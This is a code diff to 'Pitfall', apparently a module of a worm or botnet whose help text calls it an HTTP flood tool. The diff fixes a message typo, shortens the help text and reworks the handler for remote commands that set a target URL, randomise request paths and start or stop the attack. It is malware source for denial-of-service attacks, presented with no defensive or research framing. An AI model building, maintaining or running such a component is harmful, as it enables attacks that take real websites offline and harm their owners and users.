@@ -111,7 +111,7 @@ class Pitfall:
     
     def set_target(self, target: str) -> None:
         self.target = target
-        self.worm.send_msg(f"Set net target: {target}")
+        self.worm.send_msg(f"Set new target: {target}")
     
     def stop_attack(self) -> None:
         self.signal_attack.clear()
@@ -137,22 +137,20 @@ class Pitfall:
     
     
     def help(self) -> str:
-        h = "------- Pitfall (http flood) Help ---------\n"
-        h += f"{'pitfall_target':<30}Set target to attack. ex: https://example.com\n"
-        h += f"{'pitfall_sub':<30}Add random subaddress to every request. Set True, False\n"
-        h += f"{'pitfall_start':<30}Start Attack\n"
-        h += f"{'pitfall_stop':<30}Stop Attack\n"
+        h = "'pitfall_target' - Set target to attack. ex: https://example.com\n"
+        h += "'pitfall_sub' - Add random subaddress to every request. Set True, False\n"
+        h += "'pitfall_start' - Start Attack\n"
+        h += "'pitfall_stop' - Stop Attack\n"
         return h
     
-    def exec_cmd(self, cmd: dict) -> None:
-        com = cmd.get("cmd")
-        if not com:
-            return
-        match com:
+    def exec_cmd(self, cmd: list) -> None:
+        match cmd[0]:
             case "pitfall_target":
-                self.set_target(cmd.get("data"))
+                if len(cmd) > 1:
+                    self.set_target(cmd[1])
             case "pitfall_sub":
-                self.change_sub_add(cmd.get("data"))
+                if len(cmd) > 1:
+                    self.change_sub_add(cmd[1])
             case "pitfall_start":
                 self.start_attack()
             case "pitfall_stop":
